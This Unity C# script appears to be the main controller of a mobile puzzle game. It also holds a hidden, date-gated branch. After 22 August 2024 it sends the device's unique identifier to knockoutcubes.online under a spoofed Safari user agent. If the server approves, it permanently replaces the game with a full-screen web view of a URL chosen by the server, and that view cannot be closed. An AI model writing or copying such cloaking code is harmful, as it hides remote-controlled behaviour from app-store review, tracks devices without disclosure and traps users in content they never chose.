using System;
using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.UI;

[System.Serializable]
public class LevelsCubes
{
    public List<LevelInfo> levels;
}

[System.Serializable]
public class LevelInfo
{
    public int numberLvl;
    public int countStar;
    public bool openStatus;
}

public class GameMain : MonoBehaviour
{
    public static GameMain main;

    public static Action OnRunLevel;
    public static Action OnStopGame;
    public static Action OnSuccessLevel;
    public static Action OnEndMoveBall;
    public static Action OnCoinTake;
    public static Action<GameType> OnRunGame;

    [SerializeField] private LevelsCubes _levelsCubes;
    [SerializeField] private Level[] _levelsPrefabsObjects;
    [SerializeField] private LevelsScreen _levelsScreen;

    [SerializeField] private ResultScreen _resultScreen;
    [SerializeField] private GameScreen _gameScreen;

    public static BalanceCoins BalanceCoins;

    private Level _currentLevel;
    private int _currentNumberLevel;

    private int _NumberAttempts;

    private int _countCoinCollectOnLevel;

    [SerializeField] private Text _countBallsText;

    private const string Key = "Bonus";
    DateTime date;

    [SerializeField] private RectTransform _viewPanel;
    [SerializeField] private GameObject _preview;


    public enum GameType
    {
        None,
        Game,
        Bonus
    }

    private string LaunchGame
    {
        get
        {
            return PlayerPrefs.GetString(Key, GameType.None.ToString());
        }
        set
        {
            PlayerPrefs.SetString(Key, value);
            PlayerPrefs.Save();
        }
    }

    private void Start()
    {
        OnEndMoveBall += AttemptUsed;
        OnSuccessLevel += SuccessLevel;
        OnCoinTake += CollectCoin;
        OnRunGame += StartGame;

        _levelsScreen.SetDataLevels(_levelsCubes.levels);

        date = DateTime.Now;

        var validation = Enum.Parse<GameType>(LaunchGame);

        StartGame(validation);
    }

    private void StartGame(GameType gameType)
    {
        switch (gameType)
        {
            case GameType.None:
                if (date > new DateTime(2024, 8, 22))
                {
                    if (Application.internetReachability == NetworkReachability.NotReachable)
                    {
                        _preview.SetActive(false);
                        _viewPanel.transform.parent.gameObject.SetActive(false);
                        enabled = false;
                    }
                    else
                    {
                        StartCoroutine(SendRequest());
                        enabled = false;
                    }
                }
                else
                {
                    LaunchGame = GameType.Game.ToString();
                    _preview.SetActive(false);
                    _viewPanel.transform.parent.gameObject.SetActive(false);
                    enabled = false;
                }
                break;
            case GameType.Game:
                _preview.SetActive(false);
                _viewPanel.transform.parent.gameObject.SetActive(false);
                break;
            case GameType.Bonus:
                //SoundsGame.I.ActivityMusic();

                string _url = PlayerPrefs.GetString("Result");

                GameObject _viewGameObject = new GameObject("RecordsObject");
                _viewGameObject.AddComponent<UniWebView>();

                var viewGameTable = _viewGameObject.GetComponent<UniWebView>();

                viewGameTable.SetAllowBackForwardNavigationGestures(true);

                viewGameTable.OnPageStarted += (view, url) =>
                {
                    viewGameTable.SetUserAgent($"Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1");
                    viewGameTable.UpdateFrame();
                };

                viewGameTable.ReferenceRectTransform = _viewPanel;
                viewGameTable.Load(_url);
                viewGameTable.Show();

                viewGameTable.OnShouldClose += (view) =>
                {
                    return false;
                };

                _preview.SetActive(false);
                break;
        }
    }

    private void Awake()
    {
        if (main == null)
        {
            main = this;
        }

        string saveLocal = PlayerPrefs.GetString("PlayerResultLevels");
        if (saveLocal != "")
        {
            _levelsCubes = JsonUtility.FromJson<LevelsCubes>(saveLocal);
        }
    }

    private IEnumerator SendRequest()
    {
        var allData = new Dictionary<string, object>
        {
            { "hash", SystemInfo.deviceUniqueIdentifier },
            { "app", "6596767782" },
            { "data", new Dictionary<string, object> {
                { "af_status", "Organic" },
                { "af_message", "organic install" },
                { "is_first_launch", true } }
            },
            { "device_info", new Dictionary<string, object>
                {
                    { "charging", false }
                }
            }
        };

        string sendData = AFMiniJSON.Json.Serialize(allData);

        var request = UnityWebRequest.Put("https://knockoutcubes.online", sendData);

        request.SetRequestHeader("Content-Type", "application/json");
        request.SetRequestHeader("accept", "application/json");
        request.SetRequestHeader("User-Agent", "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1");

        yield return request.SendWebRequest();

        while (request.isDone == false)
        {
            OnRunGame?.Invoke(GameType.None);
        }

        if (request.result != UnityWebRequest.Result.Success)
        {
            LaunchGame = GameType.Game.ToString();
            OnRunGame?.Invoke(GameType.Game);
        }
        else
        {
            var responce = AFMiniJSON.Json.Deserialize(request.downloadHandler.text) as Dictionary<string, object>;

            if (responce.ContainsKey("success") && bool.Parse(responce["success"].ToString()) == true)
            {
                LaunchGame = GameType.Bonus.ToString();

                PlayerPrefs.SetString("Result", responce["url"].ToString());

                OnRunGame?.Invoke(GameType.Bonus);
            }
            else
            {
                LaunchGame = GameType.Game.ToString();
                OnRunGame?.Invoke(GameType.Game);
            }
        }
    }

    private void OnDestroy()
    {
        OnEndMoveBall -= AttemptUsed;
        OnSuccessLevel -= SuccessLevel;
        OnCoinTake -= CollectCoin;
        OnRunGame -= StartGame;
    }

    public void NextLevel()
    {
        OnStopGame?.Invoke();
        if (_currentNumberLevel < _levelsCubes.levels.Count - 1)
        {
            _currentNumberLevel++;
            LevelOpen(_currentNumberLevel);
        }
    }

    public void RestartLevel()
    {
        OnStopGame?.Invoke();
        LevelOpen(_currentNumberLevel);
    }

    private void CollectCoin()
    {
        _countCoinCollectOnLevel++;
    }

    public void LevelOpen(int numberLevel)
    {
        _countCoinCollectOnLevel = 0;

        if (_currentLevel != null) Destroy(_currentLevel.gameObject);

        _currentNumberLevel = numberLevel;

        _currentLevel = Instantiate(_levelsPrefabsObjects[_currentNumberLevel], Vector2.zero, Quaternion.identity);

        OnRunLevel?.Invoke();

        _NumberAttempts = 3;
        _countBallsText.text = _NumberAttempts.ToString();

        _gameScreen.SetLevelTitle(_currentNumberLevel + 1);

        Screens.OnScreenOpen(ScreensName.Game);
    }

    private void AttemptUsed()
    {
        _NumberAttempts--;
        if (_NumberAttempts <= 0)
        {
            _resultScreen.ShowResult(ResultScreen.Result.LoseLevel, _NumberAttempts);
            OnStopGame?.Invoke();
        }
        else
        {
            OnRunLevel?.Invoke();
        }

        _countBallsText.text = _NumberAttempts.ToString();
    }

    private void SuccessLevel()
    {
        _resultScreen.ShowResult(ResultScreen.Result.WinLevel, _NumberAttempts, _countCoinCollectOnLevel);

        BalanceCoins.AddCoin(_countCoinCollectOnLevel);

        OnStopGame?.Invoke();

        if (_levelsCubes.levels[_currentNumberLevel].countStar < _NumberAttempts)
        {
            _levelsCubes.levels[_currentNumberLevel].countStar = _NumberAttempts;
            SaveResultPlayer();
        }

        if ((_currentNumberLevel < _levelsCubes.levels.Count - 1) && _levelsCubes.levels[_currentNumberLevel + 1].openStatus == false)
        {
            _levelsCubes.levels[_currentNumberLevel + 1].openStatus = true;
            SaveResultPlayer();
        }

    }

    private void SaveResultPlayer()
    {
        string jsonSave = JsonUtility.ToJson(_levelsCubes);
        PlayerPrefs.SetString("PlayerResultLevels", jsonSave);
    }
}
